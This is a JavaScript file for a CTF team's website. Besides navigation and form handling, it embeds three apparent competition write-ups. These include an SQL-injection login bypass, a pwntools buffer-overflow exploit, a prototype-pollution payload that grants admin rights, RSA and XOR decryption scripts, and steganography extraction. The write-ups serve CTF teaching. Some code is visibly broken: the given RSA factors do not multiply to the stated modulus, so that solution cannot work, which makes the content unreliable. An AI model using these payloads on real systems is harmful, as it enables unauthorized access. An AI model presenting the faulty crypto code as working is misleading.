document.addEventListener('DOMContentLoaded', function() {
    // Navigation
    const navLinks = document.querySelectorAll('.nav-link');
    const pages = document.querySelectorAll('.page');
    
    // Show/hide pages based on navigation
    navLinks.forEach(link => {
        link.addEventListener('click', function(e) {
            e.preventDefault();
            const targetPage = this.getAttribute('data-page');
            
            // Remove active class from all links and pages
            navLinks.forEach(link => link.classList.remove('active'));
            pages.forEach(page => page.classList.remove('active'));
            
            // Add active class to clicked link
            this.classList.add('active');
            
            // Show the target page
            document.getElementById(`${targetPage}-page`).classList.add('active');
        });
    });
    
    // Writeup card handling
    const writeupCards = document.querySelectorAll('.writeup-card');
    const writeupDetailPage = document.getElementById('writeup-detail');
    const writeupContent = document.getElementById('writeup-content');
    const backButton = document.querySelector('.back-button');
    
    // Generate writeup content based on the clicked card
    writeupCards.forEach(card => {
        card.addEventListener('click', function() {
            const writeupId = this.getAttribute('data-writeup');
            const writeupTitle = this.querySelector('h3').textContent;
            
            // Hide writeups page and show detail page
            document.getElementById('writeups-page').classList.remove('active');
            writeupDetailPage.classList.add('active');
            
            // Generate content based on writeup ID
            writeupContent.innerHTML = generateWriteupContent(writeupId, writeupTitle);
        });
    });
    
    // Back button functionality
    backButton.addEventListener('click', function() {
        writeupDetailPage.classList.remove('active');
        document.getElementById('writeups-page').classList.add('active');
    });
    
    // Form submission handling
    const contactForm = document.querySelector('.contact-form');
    if (contactForm) {
        contactForm.addEventListener('submit', function(e) {
            e.preventDefault();
            // Here you would normally handle the form submission, e.g., send data to a server
            alert('Message sent successfully!');
            contactForm.reset();
        });
    }
    
    // Function to generate writeup content based on ID
    function generateWriteupContent(id, title) {
        // In a real implementation, you might fetch this content from a database or API
        const writeups = {
            'tfc-ctf-2025': `
                <h1>${title}</h1>
                <p>Date: May 15-17, 2025</p>
                <p>Team: OneTap CTF Team</p>
                <p>Place: 3rd</p>
                <p>Points: 4578</p>
                
                <h2>Challenge 1: Web Exploitation</h2>
                <p>This challenge involved finding an SQL injection vulnerability in a login form.</p>
                <h3>Solution:</h3>
                <p>We identified that the username field was vulnerable to SQL injection. After some testing, we found that the following payload worked:</p>
                <pre><code>admin' OR 1=1 -- -</code></pre>
                <p>This bypassed the authentication and gave us access to the admin panel, where we found the flag.</p>
                
                <h2>Challenge 2: Cryptography</h2>
                <p>This challenge required breaking an RSA encryption with weak parameters.</p>
                <h3>Solution:</h3>
                <p>We noticed that the modulus (n) was relatively small, which made it feasible to factorize using online tools. Once we had the factors p and q, we calculated the private key and decrypted the message to get the flag.</p>
                <pre><code>
from Crypto.Util.number import inverse

n = 9876543210987654321
e = 65537
c = 1234567890123456789

# Factorize n to get p and q
p = 98765432103
q = 99999999989

# Calculate private key
phi = (p-1) * (q-1)
d = inverse(e, phi)

# Decrypt
flag = pow(c, d, n)
print(bytes.fromhex(hex(flag)[2:]).decode())
                </code></pre>
            `,
            'defcon-ctf-2025': `
                <h1>${title}</h1>
                <p>Date: August 10-12, 2025</p>
                <p>Team: OneTap CTF Team</p>
                <p>Place: 12th</p>
                <p>Points: 3856</p>
                
                <h2>Challenge 1: Binary Exploitation</h2>
                <p>This challenge involved exploiting a buffer overflow vulnerability in a C program.</p>
                <h3>Solution:</h3>
                <p>We analyzed the binary and found that it had a buffer overflow vulnerability in the input function. We crafted a payload that overflowed the buffer and overwrote the return address to point to a function that would give us a shell.</p>
                <pre><code>
from pwn import *

# Connect to the remote server
conn = remote('challenges.defcon.org', 31337)

# Craft payload
payload = b'A' * 64       # Buffer size
payload += p64(0x401186)  # Address of win() function

# Send payload
conn.sendline(payload)
conn.interactive()
                </code></pre>
                
                <h2>Challenge 2: Reverse Engineering</h2>
                <p>This challenge required reverse engineering a complex algorithm in a binary file.</p>
                <h3>Solution:</h3>
                <p>Using Ghidra, we analyzed the binary and identified the main algorithm. It was an implementation of a custom encryption scheme. We wrote a script to reverse the operations:</p>
                <pre><code>
def decrypt(ciphertext, key):
    result = bytearray(len(ciphertext))
    for i in range(len(ciphertext)):
        result[i] = (ciphertext[i] ^ key[i % len(key)]) - i % 256
    return result

ciphertext = bytes.fromhex("7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d")
key = b"DEFCON2025"
flag = decrypt(ciphertext, key)
print(flag.decode())
                </code></pre>
            `,
            'googlectf-2024': `
                <h1>${title}</h1>
                <p>Date: September 5-7, 2024</p>
                <p>Team: OneTap CTF Team</p>
                <p>Place: 8th</p>
                <p>Points: 5233</p>
                
                <h2>Challenge 1: Web Security</h2>
                <p>This challenge involved exploiting a prototype pollution vulnerability in a Node.js application.</p>
                <h3>Solution:</h3>
                <p>We found that the application was using a vulnerable version of a library that allowed for prototype pollution. By sending a specially crafted JSON object, we could modify the prototype of Object and inject malicious properties that would be used later in the application.</p>
                <pre><code>
// Payload used for prototype pollution
fetch('/api/update', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    "__proto__": {
      "isAdmin": true
    }
  })
})
.then(response => response.json())
.then(data => {
  console.log('Success:', data);
  // Now navigate to the admin panel
  window.location.href = '/admin';
});
                </code></pre>
                
                <h2>Challenge 2: Steganography</h2>
                <p>This challenge involved extracting hidden data from an image file.</p>
                <h3>Solution:</h3>
                <p>We suspected there might be data hidden in the least significant bits of the image. Using Python and the PIL library, we extracted the LSBs from each color channel:</p>
                <pre><code>
from PIL import Image

def extract_lsb(image_path):
    img = Image.open(image_path)
    pixels = img.load()
    width, height = img.size
    
    binary_data = ""
    for y in range(height):
        for x in range(width):
            pixel = pixels[x, y]
            # Extract LSB from each color channel
            for value in pixel:
                binary_data += str(value & 1)
    
    # Convert binary to ASCII
    result = ""
    for i in range(0, len(binary_data), 8):
        byte = binary_data[i:i+8]
        if len(byte) == 8:
            result += chr(int(byte, 2))
    
    return result

hidden_data = extract_lsb("challenge.png")
print(hidden_data)
                </code></pre>
            `
        };
        
        return writeups[id] || `<h1>${title}</h1><p>Writeup content coming soon...</p>`;
    }
});